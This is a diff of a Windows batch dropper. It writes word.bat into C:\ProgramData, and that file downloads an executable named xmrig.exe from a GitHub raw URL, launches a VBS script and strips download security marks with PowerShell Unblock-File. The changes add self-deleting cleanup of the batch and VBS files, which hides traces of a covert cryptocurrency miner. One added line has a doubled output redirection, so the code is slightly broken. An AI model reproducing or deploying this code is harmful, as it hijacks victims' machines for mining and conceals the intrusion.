@@ -47,7 +47,10 @@ echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.
 echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe">> "C:\ProgramData\word.bat"
 echo timeout 0>> "C:\ProgramData\word.bat"
 echo start "" "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
-echo exit>> "C:\ProgramData\word.bat"
+echo timeout 1>> "C:\ProgramData\word.bat"
+echo del "C:\ProgramData\word.bat">> "C:\ProgramData\word.bat"
+echo del "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
+echo exit>> "C:\ProgramData\word.bat">> "C:\ProgramData\word.bat"
 powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
